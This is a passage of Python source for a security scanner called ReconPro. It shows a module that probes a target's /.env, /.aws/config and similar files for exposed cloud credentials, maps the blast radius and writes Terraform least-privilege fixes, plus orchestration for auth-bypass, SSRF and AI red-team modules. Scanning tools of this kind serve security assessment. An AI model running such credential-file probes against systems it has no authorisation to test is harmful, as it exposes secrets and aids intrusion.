    if re.search(r'[a-z]', value):
        classes += 1
    if re.search(r'[A-Z]', value):
        classes += 1
    if re.search(r'[0-9]', value):
        classes += 1
    if re.search(r'[_\-.@/]', value):
        classes += 1
    return classes >= 2


def _nhi_op_severity(op_name: str) -> str:
    """Map over-permission pattern name to severity."""
    severity_map = {
        "wildcard_action": "critical",
        "wildcard_resource": "critical",
        "admin_wildcard": "critical",
        "s3_full_bucket": "high",
        "iam_passrole": "high",
    }
    return severity_map.get(op_name, "medium")


def _nhi_compute_risk(identities: list, overpermissions: list, blast_radius: dict) -> int:
    """Compute 0-100 risk score for NHI findings."""
    score = 0
    verified = [i for i in identities if i.get("verified")]
    score += min(30, len(verified) * 8)
    critical_ops = [o for o in overpermissions if o.get("severity") == "critical"]
    high_ops = [o for o in overpermissions if o.get("severity") == "high"]
    score += min(40, len(critical_ops) * 15 + len(high_ops) * 8)
    score += min(30, blast_radius.get("max_depth", 0) * 5 + blast_radius.get("reachable_services", 0) * 5)
    return min(100, score)


def _nhi_generate_remediation(overpermissions: list, identities: list, host: str) -> str:
    """Generate Terraform remediation patch for detected wildcards."""
    if not overpermissions:
        return ""
    lines = ['# Terraform Remediation Patch — generated by ReconPro NHI Graph']
    lines.append(f'# Target: {host}')
    lines.append(f'# Generated: {datetime.utcnow().isoformat()}Z')
    lines.append('')

    for op in overpermissions:
        pattern = op.get("pattern", "")
        safe = _safe_filename(host)

        if pattern == "wildcard_action":
            lines.append('# ── Replace wildcard Action with least-privilege ──')
            lines.append('resource "aws_iam_policy" "least_privilege" {')
            lines.append(f'  name        = "least-privilege-{safe}"')
            lines.append('  description = "Least-privilege policy replacing wildcard"')
            lines.append('  policy = jsonencode({')
            lines.append('    Version = "2012-10-17"')
            lines.append('    Statement = [{')
            lines.append('      Effect   = "Allow"')
            lines.append('      Action   = ["s3:GetObject", "s3:ListBucket"]  # Replace with actual needed actions')
            lines.append('      Resource = ["arn:aws:s3:::your-bucket/*"]')
            lines.append('    }]')
            lines.append('  })')
            lines.append('}')
            lines.append('')

        elif pattern == "wildcard_resource":
            lines.append('# ── Restrict wildcard Resource to specific ARNs ──')
            lines.append('resource "aws_iam_policy" "restricted_resource" {')
            lines.append(f'  name        = "restricted-resource-{safe}"')
            lines.append('  policy = jsonencode({')
            lines.append('    Version = "2012-10-17"')
            lines.append('    Statement = [{')
            lines.append('      Effect   = "Allow"')
            lines.append('      Action   = "*"  # TODO: scope this action too')
            lines.append('      Resource = ["arn:aws:s3:::your-specific-bucket/*"]  # Replace wildcard')
            lines.append('    }]')
            lines.append('  })')
            lines.append('}')
            lines.append('')

        elif pattern == "admin_wildcard":
            lines.append('# ── Remove AdministratorAccess — use scoped policy ──')
            lines.append('# WARNING: AdministratorAccess grants full access to all AWS resources')
            lines.append('resource "aws_iam_role_policy_attachment" "remove_admin" {')
            lines.append('  role       = "your-role-name"')
            lines.append('  # Detach: "arn:aws:iam::aws:policy/AdministratorAccess"')
            lines.append('  policy_arn = aws_iam_policy.least_privilege.arn')
            lines.append('}')
            lines.append('')

        elif pattern == "s3_full_bucket":
            lines.append('# ── Scope S3 permissions to specific buckets ──')
            lines.append('resource "aws_iam_policy" "s3_scoped" {')
            lines.append(f'  name        = "s3-scoped-{safe}"')
            lines.append('  policy = jsonencode({')
            lines.append('    Version = "2012-10-17"')
            lines.append('    Statement = [{')
            lines.append('      Effect   = "Allow"')
            lines.append('      Action   = ["s3:GetObject", "s3:PutObject", "s3:ListBucket"]')
            lines.append('      Resource = [')
            lines.append('        "arn:aws:s3:::your-bucket",')
            lines.append('        "arn:aws:s3:::your-bucket/*"')
            lines.append('      ]')
            lines.append('    }]')
            lines.append('  })')
            lines.append('}')
            lines.append('')

        elif pattern == "iam_passrole":
            lines.append('# ── Restrict iam:PassRole to specific roles ──')
            lines.append('resource "aws_iam_policy" "passrole_restricted" {')
            lines.append(f'  name        = "passrole-restricted-{safe}"')
            lines.append('  policy = jsonencode({')
            lines.append('    Version = "2012-10-17"')
            lines.append('    Statement = [{')
            lines.append('      Effect   = "Allow"')
            lines.append('      Action   = "iam:PassRole"')
            lines.append('      Resource = "arn:aws:iam::*:role/your-specific-role"')
            lines.append('      Condition = {')
            lines.append('        StringEquals = {')
            lines.append('          "iam:PassedToService" = "ec2.amazonaws.com"')
            lines.append('        }')
            lines.append('      }')
            lines.append('    }]')
            lines.append('  })')
            lines.append('}')
            lines.append('')

    verified = [i for i in identities if i.get("verified")]
    if verified:
        lines.append('# ── Rotate exposed credentials ──')
        lines.append('# ACTION REQUIRED: Rotate the following exposed credentials immediately:')
        for ident in verified[:10]:
            lines.append(f'#   - {ident["type"]}: {ident["value"][:60]} (found in {ident["source"]})')
        lines.append('')

    return "\n".join(lines)


def module_nhi_graph(host: str) -> Dict[str, Any]:
    """Non-Human Identity & Blast-Radius Mapping.

    Scans target for:
      1. Cloud identity signals in page source, JS, metadata
      2. Over-permissioned IAM/role patterns
      3. Exposed service account credentials
      4. Graph construction: nodes (Identity, Role, Endpoint, Database)
         edges (HAS_ACCESS_TO, CAN_ASSUME, EXPOSES_TOKEN)
      5. Blast-radius: traverse from any vulnerability to connected resources
      6. Generate Terraform remediation patch for detected wildcards
    """
    audit_log("nhi_graph.start", detail=f"target={host}")

    # Paths to probe for identity signals
    probe_paths = [
        "/",
        "/.well-known/",
        "/robots.txt",
        "/sitemap.xml",
        "/api/",
        "/config.json",
        "/.env",
        "/package.json",
        "/firebase.json",
        "/.aws/config",
        "/.github/workflows/",
    ]

    base = host if host.startswith("http") else f"https://{host}"
    if not base.endswith("/"):
        base += "/"

    identities_found = []
    all_bodies = []  # (path, body_text, resp_dict) pairs for context analysis

    # Phase 1: Fetch and scan for identity patterns
    for path in probe_paths:
        url = base + path.lstrip("/")
        try:
            resp = http_probe(url)
        except Exception as e:
            audit_log("nhi_graph.probe.error", status=type(e).__name__, detail=f"url={url} err={str(e)[:120]}")
            continue
        body = resp.get("body", "")
        if body:
            all_bodies.append((path, body, resp))

        for pat_name, pat_re in NHI_IDENTITY_PATTERNS:
            matches = pat_re.findall(body)
            seen = set()
            for match in matches:
                val = match if isinstance(match, str) else (match[0] if match and isinstance(match, tuple) else "")
                if not val or val in seen:
                    continue
                seen.add(val)

                verified = _nhi_verify_match(val, body)

                identities_found.append({
                    "type": pat_name,
                    "value": val,
                    "source": path,
                    "verified": verified,
                })

    audit_log("nhi_graph.scan", detail=f"identities_raw={len(identities_found)}")

    # Phase 2: Build identity graph
    nodes = []
    edges = []
    node_id_map = {}  # label -> node_id
    node_counter = [0]

    def _add_node(label: str, ntype: str) -> str:
        if label in node_id_map:
            return node_id_map[label]
        nid = f"nhi_{node_counter[0]}"
        node_counter[0] += 1
        node_id_map[label] = nid
        nodes.append({"id": nid, "type": ntype, "label": label})
        return nid

    def _add_edge(src_id: str, tgt_id: str, relation: str):
        if src_id and tgt_id and src_id != tgt_id:
            edges.append({"source": src_id, "target": tgt_id, "relation": relation})

    # Target endpoint node
    target_node = _add_node(host, "Endpoint")

    # Identity nodes
    for ident in identities_found:
        id_node = _add_node(ident["value"], "Identity")
        _add_edge(target_node, id_node, "EXPOSES_TOKEN")

    # Phase 3: Check for over-permission patterns in response bodies
    overpermissions = []
    for path, body, resp in all_bodies:
        for op_name, op_re in NHI_OVERPERMISSION_PATTERNS:
            op_matches = op_re.findall(body)
            seen_op = set()
            for op_val in op_matches:
                val = op_val if isinstance(op_val, str) else (op_val[0] if op_val and isinstance(op_val, tuple) else "")
                if not val or val in seen_op:
                    continue
                seen_op.add(val)

                linked = [i for i in identities_found if i["source"] == path]
                linked_strs = [f'{i["type"]}:{i["value"][:30]}' for i in linked[:3]]

                severity = _nhi_op_severity(op_name)
                overpermissions.append({
                    "identity": linked_strs[0] if linked_strs else "unknown",
                    "pattern": op_name,
                    "severity": severity,
                    "description": f"Found '{val}' in {path}",
                    "value": val,
                })

                op_node = _add_node(f"OVERPERM:{op_name}", "Role")
                _add_edge(target_node, op_node, "HAS_ACCESS_TO")

    audit_log("nhi_graph.overpermissions", detail=f"count={len(overpermissions)}")

    # Phase 4: Compute blast radius via BFS
    adj = {}  # adjacency list (undirected)
    for node in nodes:
        adj[node["id"]] = set()
    for edge in edges:
        if edge["source"] in adj:
            adj[edge["source"]].add(edge["target"])
        if edge["target"] in adj:
            adj[edge["target"]].add(edge["source"])

    max_depth = 0
    reachable_types = {"Database": set(), "Secret": set(), "Service": set()}

    for ident in identities_found:
        if ident["value"] not in node_id_map:
            continue
        start = node_id_map[ident["value"]]
        visited = {start}
        queue = [(start, 0)]
        while queue:
            current, depth = queue.pop(0)
            if depth > max_depth:
                max_depth = depth
            for neighbor in adj.get(current, set()):
                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append((neighbor, depth + 1))
            for node in nodes:
                if node["id"] == current:
                    ntype = node["type"]
                    if ntype == "Database":
                        reachable_types["Database"].add(current)
                    elif ntype == "Identity":
                        reachable_types["Secret"].add(current)
                    elif ntype in ("Role", "Service"):
                        reachable_types["Service"].add(current)

    blast_radius = {
        "max_depth": max_depth,
        "reachable_databases": len(reachable_types["Database"]),
        "reachable_secrets": len(reachable_types["Secret"]),
        "reachable_services": len(reachable_types["Service"]),
    }

    # Phase 5: Generate Terraform remediation
    remediation_tf = _nhi_generate_remediation(overpermissions, identities_found, host)

    # Phase 6: Compute risk score
    risk_score = _nhi_compute_risk(identities_found, overpermissions, blast_radius)

    result = {
        "module": "NHI GRAPH",
        "identities_found": identities_found,
        "nodes": nodes,
        "edges": edges,
        "overpermissions": overpermissions,
        "blast_radius": blast_radius,
        "remediation_tf": remediation_tf,
        "total_identities": len(identities_found),
        "risk_score": risk_score,
    }

    audit_log("nhi_graph.complete", detail=f"risk={risk_score} identities={len(identities_found)} ops={len(overpermissions)}")
    return result


def render_nhi_graph_panel(nhi: Dict[str, Any]) -> None:
    """Render NHI Graph results with identity tree, overpermissions table, and remediation."""
    score = nhi.get("risk_score", 0)
    total = nhi.get("total_identities", 0)
    blast = nhi.get("blast_radius", {})
    op_count = len(nhi.get("overpermissions", []))

    # Score bar
    bar_width = 40
    filled = int(score / 100 * bar_width)
    bar = "█" * filled + "░" * (bar_width - filled)

    if score >= 70:
        sc_color = "bright_red"
    elif score >= 40:
        sc_color = "yellow"
    else:
        sc_color = "green"

    console.print(Panel(
        Group(
            Text("\n  NHI GRAPH — Non-Human Identity & Blast-Radius Mapping", style="bold cyan"),
            Text(""),
            Text(f"  Risk Score: {bar} [bold {sc_color}]{score}/100[/{sc_color}]", style="white"),
            Text(""),
            Text(f"  Identities Found: [bold]{total}[/]  |  "
                 f"Over-permissions: [bold]{op_count}[/]  |  "
                 f"Blast Depth: [bold]{blast.get('max_depth', 0)}[/]"),
            Text(f"  Reachable: [red]{blast.get('reachable_databases', 0)} DBs[/], "
                 f"[yellow]{blast.get('reachable_secrets', 0)} secrets[/], "
                 f"[magenta]{blast.get('reachable_services', 0)} services[/]"),
        ),
        border_style="cyan",
        title="[bold]NHI GRAPH[/bold]",
        title_align="left",
        padding=(1, 2),
    ))

    # Identity graph tree
    nodes = nhi.get("nodes", [])
    edges = nhi.get("edges", [])
    if nodes:
        adj = {}
        for node in nodes:
            adj[node["id"]] = []
        for edge in edges:
            if edge["source"] in adj:
                adj[edge["source"]].append(edge)

        tree = Tree("🌐 [bold]Identity Graph[/]", guide_style="cyan")

        root_nodes = [n for n in nodes if n["type"] == "Endpoint"]
        if root_nodes:
            root = root_nodes[0]
            root_branch = tree.add(f"[bold]{root['label']}[/]")

            type_colors = {
                "Identity": "yellow",
                "Role": "red",
                "Endpoint": "cyan",
                "Database": "green",
                "Service": "magenta",
            }

            for edge in adj.get(root["id"], []):
                target_node = next((n for n in nodes if n["id"] == edge["target"]), None)
                if target_node:
                    tcolor = type_colors.get(target_node["type"], "white")
                    label = target_node["label"]
                    if len(label) > 50:
                        label = label[:47] + "..."
                    branch = root_branch.add(
                        f"[{tcolor}]{label}[/{tcolor}] [dim]({target_node['type']} • {edge['relation']})[/]"
                    )

                    for child_edge in adj.get(target_node["id"], []):
                        child_node = next((n for n in nodes if n["id"] == child_edge["target"]), None)
                        if child_node:
                            cc = type_colors.get(child_node["type"], "white")
                            cl = child_node["label"]
                            if len(cl) > 45:
                                cl = cl[:42] + "..."
                            branch.add(
                                f"[{cc}]{cl}[/{cc}] [dim]({child_edge['relation']})[/]"
                            )

        console.print(tree)

    # Over-permissions table
    overpermissions = nhi.get("overpermissions", [])
    if overpermissions:
        table = Table(title=f"Over-Permissions — {len(overpermissions)} detected",
                      border_style="red", header_style="bold red", show_lines=False)
        table.add_column("Severity", style="bold", width=10)
        table.add_column("Pattern", style="yellow", width=20)
        table.add_column("Identity", style="cyan")
        table.add_column("Description", style="white")
        sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green"}
        for op in overpermissions[:15]:
            sev = op.get("severity", "medium")
            table.add_row(
                f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
                op.get("pattern", ""),
                op.get("identity", "")[:40],
                op.get("description", "")[:60]
            )
        console.print(table)

    # Terraform remediation
    remediation = nhi.get("remediation_tf", "")
    if remediation:
        tf_lines = remediation.split("\n")[:20]
        tf_display = "\n".join(tf_lines)
        if len(remediation.split("\n")) > 20:
            tf_display += "\n  ... (truncated)"
        console.print()
        console.print(Panel(
            Group(
                Text("  Terraform Remediation Patch:", style="bold dim"),
                Text(""),
                Text(f"  {tf_display}", style="green"),
            ),
            border_style="dim",
            title="[dim]Remediation[/dim]",
            title_align="left",
            padding=(0, 2),
        ))


# ══════════════════════════════════════════════════════════════════════════════
# UNIFIED VERDICT — combines scores from all 8 modules
# ══════════════════════════════════════════════════════════════════════════════

def compute_unified_verdict(report: Dict[str, Any]) -> Dict[str, Any]:
    """Combine all module scores into a unified verdict."""
    scores = {}
    # RECON: weighted by severity counts
    recon = report.get("recon", {})
    sc = recon.get("severity_counts", {})
    scores["recon"] = min(100, sc.get("critical", 0) * 25 + sc.get("high", 0) * 15 +
                          sc.get("medium", 0) * 8 + sc.get("low", 0) * 3 + sc.get("info", 0))
    # AUTH: bypasses / 75 * 100
    auth = report.get("auth_bypass", {})
    scores["auth"] = min(100, int((auth.get("bypasses_successful", 0) / max(1, auth.get("total_attempts", 1))) * 400))
    # CHAIN: SSRF + open redirects
    chain = report.get("chain_hunter", {})
    scores["chain"] = min(100, chain.get("ssrf_detected", 0) * 25 + chain.get("open_redirects", 0) * 15)
    # BOT: bot hits
    bot = report.get("bot_hunter", {})
    scores["bot"] = min(100, bot.get("bot_hits", 0) * 20)
    # GORGON
    gorgon = report.get("gorgon", {})
    scores["gorgon"] = gorgon.get("threatScore", gorgon.get("verdict", {}).get("threatScore", 0)) if isinstance(gorgon, dict) else 0
    # OBLIVION
    oblivion = report.get("oblivion", {})
    scores["oblivion"] = oblivion.get("verdict", {}).get("threatScore", 0) if isinstance(oblivion, dict) else 0
    # VIBESEC: inverted score (low vibesec = more dangerous for unified)
    vibesec = report.get("vibesec", {})
    vibesec_score = vibesec.get("vibesec_score", 100) if isinstance(vibesec, dict) else 100
    scores["vibesec"] = 100 - vibesec_score  # invert: more vibe-vulns = higher unified threat
    # NHI GRAPH: direct risk score
    nhi = report.get("nhi_graph", {})
    scores["nhi"] = nhi.get("risk_score", 0) if isinstance(nhi, dict) else 0

    # Weighted unified score
    weights = {"recon": 0.07, "auth": 0.11, "chain": 0.11, "bot": 0.07, "gorgon": 0.16, "oblivion": 0.24, "vibesec": 0.10, "nhi": 0.14}
    unified = int(sum(scores.get(k, 0) * w for k, w in weights.items()))

    if unified >= 90: verdict = "OMNIPOTENT VERDICT — The target has been comprehensively dissolved."
    elif unified >= 75: verdict = "DEVASTATING VERDICT — The target's defenses are thoroughly compromised."
    elif unified >= 50: verdict = "SUBSTANTIAL VERDICT — Multiple critical exposures confirmed."
    elif unified >= 25: verdict = "NOTABLE VERDICT — Some exposures detected."
    else: verdict = "MUNDANE VERDICT — The target resisted most probes."

    return {
        "unified_score": unified,
        "module_scores": scores,
        "verdict_text": verdict,
        "verdict_level": "OMNIPOTENT" if unified >= 90 else "DEVASTATING" if unified >= 75 else
                          "SUBSTANTIAL" if unified >= 50 else "NOTABLE" if unified >= 25 else "MUNDANE",
    }

# ══════════════════════════════════════════════════════════════════════════════
# RICH VISUAL RENDERERS
# ══════════════════════════════════════════════════════════════════════════════

def render_banner():
    """Render the unified banner."""
    banner_text = Text(BANNER, style="bold bright_cyan")
    tagline = Text(f"\n  {RECONPRO_TAGLINE}\n  Version: {RECONPRO_VERSION}", style="bold bright_magenta")
    sig = Text(f"\n  Signature: {RECONPRO_SIGNATURE}", style="dim cyan")
    panel = Panel(Align.center(Group(banner_text, tagline, sig)),
                  border_style="bright_cyan", padding=(1, 2))
    console.print(panel)

def render_module_list():
    """Render the 8 modules as a table."""
    table = Table(title="The Eight Blades", border_style="bright_cyan", header_style="bold bright_cyan")
    table.add_column("#", style="dim", width=3)
    table.add_column("Module", style="bold")
    table.add_column("Description", style="cyan")
    for i, m in enumerate(MODULES, 1):
        table.add_row(str(i), m["name"], m["desc"])
    console.print(table)

def render_module_progress(module_name: str, status: str, color: str = "cyan"):
    """Render a single module status line."""
    icon = {"running": "[bold yellow]⚙[/]", "done": "[bold green]✓[/]", "failed": "[bold red]✗[/]"}.get(status, "[yellow]?[/]")
    console.print(f"  {icon} [{color}]{module_name}[/{color}] — {status}")

def render_recon_table(recon: Dict[str, Any]):
    """Render RECON findings as a table."""
    if not recon.get("findings"):
        console.print("  [dim]No findings[/]")
        return
    table = Table(title=f"RECON — {recon['total_findings']} findings across {len(recon['categories_run'])} categories",
                  border_style="cyan", header_style="bold cyan", show_lines=False)
    table.add_column("Severity", style="bold", width=10)
    table.add_column("Category", style="cyan", width=12)
    table.add_column("Finding", style="white")
    sev_colors = {"critical": "bright_red", "high": "red", "medium": "yellow", "low": "green", "info": "dim"}
    for f in recon["findings"][:30]:
        sev = f["severity"]
        table.add_row(f"[{sev_colors.get(sev, 'white')}]{sev.upper()}[/{sev_colors.get(sev, 'white')}]",
                      f["category"], f["title"][:80])
    console.print(table)
    # Severity summary
    sc = recon["severity_counts"]
    console.print(f"  [bold]Severity breakdown:[/bold] "
                  f"[bright_red]{sc.get('critical',0)} critical[/], "
                  f"[red]{sc.get('high',0)} high[/], "
                  f"[yellow]{sc.get('medium',0)} medium[/], "
                  f"[green]{sc.get('low',0)} low[/], "
                  f"[dim]{sc.get('info',0)} info[/]")

def render_auth_table(auth: Dict[str, Any]):
    """Render AUTH BYPASS results."""
    bypasses = auth.get("bypass_findings", [])
    if bypasses:
        table = Table(title=f"AUTH BYPASS — {len(bypasses)} successful bypasses", border_style="bright_red",
                      header_style="bold bright_red")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Technique", style="yellow")
        table.add_column("Endpoint", style="cyan")
        table.add_column("Status", style="green", width=8)
        for b in bypasses[:15]:
            table.add_row(b["id"], b["name"][:40], b["endpoint"], str(b["status"]))
        console.print(table)
    else:
        console.print(f"  [yellow]AUTH BYPASS — {auth.get('total_attempts',0)} attempts, 0 bypasses[/]")
    console.print(f"  [dim]Tested {auth.get('techniques_tested',0)} techniques × {auth.get('endpoints_per_technique',0)} endpoints[/]")

def render_chain_table(chain: Dict[str, Any]):
    """Render CHAIN HUNTER results."""
    ssrf = chain.get("findings", [])
    hits = [s for s in ssrf if s.get("ssrf_detected")]
    if hits:
        table = Table(title=f"CHAIN HUNTER — {len(hits)} SSRF detected", border_style="bright_magenta",
                      header_style="bold bright_magenta")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Vector", style="magenta")
        table.add_column("Endpoint", style="cyan")
        for h in hits[:10]:
            table.add_row(h["id"], h["vector"][:50], h["endpoint"])
        console.print(table)
    else:
        console.print(f"  [magenta]CHAIN HUNTER — {chain.get('chains_tested',0)} chains tested, 0 SSRF confirmed[/]")
    redirects = chain.get("redirect_chains", [])
    if redirects:
        console.print(f"  [dim]Redirect chains: {len(redirects)} found, {chain.get('open_redirects',0)} open redirects[/]")

def render_bot_table(bot: Dict[str, Any]):
    """Render BOT HUNTER results."""
    hits = bot.get("bot_findings", [])
    if hits:
        table = Table(title=f"BOT HUNTER — {len(hits)} bot/C2 indicators", border_style="bright_red",
                      header_style="bold bright_red")
        table.add_column("Signature", style="red")
        table.add_column("Detail", style="cyan")
        for h in hits[:10]:
            detail = h.get("path", f"port {h.get('port','?')}")
            table.add_row(h.get("signature", "?"), detail)
        console.print(table)
    else:
        console.print(f"  [red]BOT HUNTER — {bot.get('signatures_tested',0)} signatures tested, 0 hits[/]")

def render_gorgon_summary(gorgon: Dict[str, Any]):
    """Render GORGON ULTRA summary."""
    if "error" in gorgon:
        console.print(f"  [bright_red]GORGON ULTRA — error: {gorgon['error']}[/]")
        return
    score = gorgon.get("threatScore", 0)
    fear = gorgon.get("fearIndex", 0)
    level = gorgon.get("threatLevel", "UNKNOWN")
    fear_level = gorgon.get("fearLevel", "UNKNOWN")
    console.print(f"  [bright_red]GORGON ULTRA — Threat: {score}/100 [{level}], Fear: {fear}/100 [{fear_level}][/]")
    summary = gorgon.get("summary", {})
    if summary:
        console.print(f"  [dim]Endpoints: {summary.get('endpointsDiscovered',0)} | "
                      f"Injection bypasses: {summary.get('injectionBypassesSuccessful',0)} | "
                      f"Multi-turn bypasses: {summary.get('multiTurnBypassesSuccessful',0)} | "
                      f"CVEs: {summary.get('cvesMatched',0)} | "
                      f"Secrets: {summary.get('secretsExtracted',0)}[/]")

def render_oblivion_summary(oblivion: Dict[str, Any]):
    """Render OBLIVION summary."""
    if "error" in oblivion:
        console.print(f"  [bright_magenta]OBLIVION — error: {oblivion['error']}[/]")
        return
    verdict = oblivion.get("verdict", {})
    score = verdict.get("threatScore", 0)
    dread = verdict.get("dreadIndex", {})
    dread_score = dread.get("score", 0)
    dread_level = dread.get("level", "UNKNOWN")
    quote = verdict.get("wisdomQuote", "")
    console.print(f"  [bright_magenta]OBLIVION — Threat: {score}/100, Dread: {dread_score}/100 [{dread_level}][/]")
    if quote:
        console.print(f"  [italic bright_magenta]\"{quote}\"[/]")

def render_unified_verdict(verdict: Dict[str, Any]):
    """Render the final unified verdict."""
    score = verdict["unified_score"]
    level = verdict["verdict_level"]
    color = {"OMNIPOTENT": "bright_magenta", "DEVASTATING": "bright_red", "SUBSTANTIAL": "red",
             "NOTABLE": "yellow", "MUNDANE": "dim"}.get(level, "white")
    # Score bar
    bar_width = 40
    filled = int(score / 100 * bar_width)
    bar = "█" * filled + "░" * (bar_width - filled)

    text = Group(
        Text(f"\n  UNIFIED VERDICT", style=f"bold {color}"),
        Text(f"  {bar} {score}/100", style=f"bold {color}"),
        Text(f"  Level: {level}", style=f"bold {color}"),
        Text(f"  {verdict['verdict_text']}", style="white"),
        Text(""),
        Text("  Module Scores:", style="bold cyan"),
    )
    for k, v in verdict["module_scores"].items():
        mod_color = {"recon": "cyan", "auth": "yellow", "chain": "magenta",
                     "bot": "red", "gorgon": "bright_red", "oblivion": "bright_magenta",
                     "vibesec": "bright_green", "nhi": "cyan"}.get(k, "white")
        bar_w = 20
        filled = int(v / 100 * bar_w)
        bar = "█" * filled + "░" * (bar_w - filled)
        line = Text()
        line.append(f"    {k.upper():12s} ", style=mod_color)
        line.append(f"{bar} ", style="dim")
        line.append(f"{v:3d}/100", style=mod_color)
        text.renderables.append(line)

    panel = Panel(text, border_style=color, title="[bold]FINAL VERDICT[/bold]", title_align="left", padding=(1, 2))
    console.print(panel)

# ══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATION
# ══════════════════════════════════════════════════════════════════════════════

def run_unified_scan(host: str, modules: List[str] = None) -> Dict[str, Any]:
    """Run the unified scan across all selected modules."""
    if modules is None:
        modules = [m["id"] for m in MODULES]

    encounter_id = generate_encounter_id(host)
    start = time.time()

    # Header
    console.print()
    render_banner()
    console.print(f"\n  [bold bright_cyan]Target:[/] [bold white]{host}[/]")
    console.print(f"  [bold bright_cyan]Encounter ID:[/] [bold white]{encounter_id}[/]")
    console.print(f"  [bold bright_cyan]Modules Selected:[/] [bold white]{', '.join(modules).upper()}[/]")
    console.print(f"  [bold bright_cyan]Signature:[/] [dim]{RECONPRO_SIGNATURE}[/]\n")

    console.print(Rule("[bold bright_cyan]The Eight Blades[/]", style="bright_cyan"))
    render_module_list()
    console.print(Rule(style="bright_cyan"))

    report: Dict[str, Any] = {
        "engine": RECONPRO_NAME,
        "tagline": RECONPRO_TAGLINE,
        "version": RECONPRO_VERSION,
        "signature": RECONPRO_SIGNATURE,
        "encounter_id": encounter_id,
        "target": host,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "modules_selected": modules,
    }

    # Run each module
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        # RECON
        if "recon" in modules:
            task = progress.add_task("[cyan]RECON — 13-category surface reconnaissance...", total=None)
            try:
                recon = module_recon(host)
                report["recon"] = recon
                progress.update(task, completed=True, description="[green]✓ RECON complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ RECON failed: {e}")
            progress.refresh()

        # AUTH BYPASS
        if "auth" in modules:
            task = progress.add_task("[yellow]AUTH BYPASS — 15 techniques × 5 endpoints...", total=None)
            try:
                auth = module_auth_bypass(host)
                report["auth_bypass"] = auth
                progress.update(task, completed=True, description="[green]✓ AUTH BYPASS complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ AUTH BYPASS failed: {e}")

        # CHAIN HUNTER
        if "chain" in modules:
            task = progress.add_task("[magenta]CHAIN HUNTER — SSRF + redirect chains...", total=None)
            try:
                chain = module_chain_hunter(host)
                report["chain_hunter"] = chain
                progress.update(task, completed=True, description="[green]✓ CHAIN HUNTER complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ CHAIN HUNTER failed: {e}")

        # BOT HUNTER
        if "bot" in modules:
            task = progress.add_task("[red]BOT HUNTER — C2 / bot infrastructure...", total=None)
            try:
                bot = module_bot_hunter(host)
                report["bot_hunter"] = bot
                progress.update(task, completed=True, description="[green]✓ BOT HUNTER complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ BOT HUNTER failed: {e}")

        # GORGON ULTRA
        if "gorgon" in modules:
            task = progress.add_task("[bright_red]GORGON ULTRA — 15-stage AI red team...", total=None)
            try:
                gorgon = module_gorgon(host)
                report["gorgon"] = gorgon
                progress.update(task, completed=True, description="[green]✓ GORGON ULTRA complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ GORGON failed: {e}")

        # OBLIVION
        if "oblivion" in modules:
            task = progress.add_task("[bright_magenta]OBLIVION — 23-stage analytical dissolution...", total=None)
            try:
                oblivion = module_oblivion(host)
                report["oblivion"] = oblivion
                progress.update(task, completed=True, description="[green]✓ OBLIVION complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ OBLIVION failed: {e}")

        # VIBESEC
        if "vibesec" in modules:
            task = progress.add_task("[bright_green]VIBESEC — AI/vibe-coding vulnerability benchmark...", total=None)
            try:
                vibesec = module_vibesec(host)
                report["vibesec"] = vibesec
                progress.update(task, completed=True, description="[green]✓ VIBESEC complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ VIBESEC failed: {e}")

        # NHI GRAPH
        if "nhi" in modules:
            task = progress.add_task("[cyan]NHI GRAPH — Non-Human Identity & blast-radius mapping...", total=None)
            try:
                nhi = module_nhi_graph(host)
                report["nhi_graph"] = nhi
                progress.update(task, completed=True, description="[green]✓ NHI GRAPH complete")
            except Exception as e:
                progress.update(task, completed=True, description=f"[red]✗ NHI GRAPH failed: {e}")

    elapsed = round(time.time() - start, 2)
    report["duration_seconds"] = elapsed

    # Unified verdict
    try:
        verdict = compute_unified_verdict(report)
        report["unified_verdict"] = verdict
    except Exception as e:
        verdict = {"unified_score": 0, "module_scores": {}, "verdict_text": f"verdict error: {e}", "verdict_level": "ERROR"}
        report["unified_verdict"] = verdict

    # Save report FIRST so it's never lost to a renderer bug
    try:
        os.makedirs("/home/z/my-project/download", exist_ok=True)
        safe_host = _safe_filename(host)
        early_out = f"/home/z/my-project/download/reconpro_unified_{safe_host}.json"
        with open(early_out, "w") as f:
            json.dump(report, f, indent=2, default=str)
        report["_auto_saved_to"] = early_out
    except Exception as e:
        audit_log("report.autosave.error", status=type(e).__name__, detail=str(e)[:120])

    # Render results (each renderer is wrapped so one failure doesn't kill the rest)
    console.print()
    console.print(Rule("[bold bright_cyan]Module Results[/]", style="bright_cyan"))

    def _safe(label, fn, data):
        try:
            if data and "error" not in data:
                console.print()
                fn(data)
            elif data:
                console.print(f"\n  [red]{label} — error: {data.get('error','?')}[/]")
        except Exception as e:
            console.print(f"\n  [red]{label} — render error: {e}[/]")

    _safe("RECON", render_recon_table, report.get("recon"))
    _safe("AUTH BYPASS", render_auth_table, report.get("auth_bypass"))
    _safe("CHAIN HUNTER", render_chain_table, report.get("chain_hunter"))
    _safe("BOT HUNTER", render_bot_table, report.get("bot_hunter"))
    _safe("GORGON ULTRA", render_gorgon_summary, report.get("gorgon"))
    _safe("OBLIVION", render_oblivion_summary, report.get("oblivion"))
    _safe("VIBESEC", render_vibesec_panel, report.get("vibesec"))
    _safe("NHI GRAPH", render_nhi_graph_panel, report.get("nhi_graph"))

    # Final verdict
    console.print()
    console.print(Rule("[bold bright_magenta]Final Verdict[/]", style="bright_magenta"))
    try:
        render_unified_verdict(verdict)
    except Exception as e:
        console.print(f"  [red]verdict render error: {e}[/]")

    console.print(f"\n  [dim]Total elapsed: {elapsed}s | Encounter: {encounter_id}[/]")
